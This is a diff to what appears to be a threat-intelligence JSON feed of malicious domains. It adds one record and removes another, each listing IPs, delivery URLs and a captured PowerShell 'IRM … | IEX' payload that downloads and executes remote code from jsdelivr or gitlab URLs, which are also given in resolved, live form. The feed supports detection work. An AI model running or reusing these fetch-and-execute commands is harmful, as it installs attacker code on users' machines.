@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "bastion-kansk.ru",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.9.147.250"
+    ],
+    "Related": [
+      {
+        "Value": "https://urshort.com/nsehzscux0r9",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwmw4g2q1ulx0omljr4g3cvy",
+    "ScannedAt": "2026-11-19T01:47:35.719000+00:00"
+  },
+  {
     "UrlDomain": "purebrookkitchens.com",
     "DeliveryUrl": [
       "lskannsserv.beer",
@@ -8541,25 +8563,5 @@
     ],
     "ReportId": "cmwh8ut7p0pca0omlsvkn7e9j",
     "ScannedAt": "2026-11-15T02:57:24.123000+00:00"
-  },
-  {
-    "UrlDomain": "droid-digital.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.252.125"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
-    ],
-    "ReportId": "cmwh6rtfu0ot30omlftsxinhi",
-    "ScannedAt": "2026-11-15T01:59:05.218000+00:00"
   }
 ]
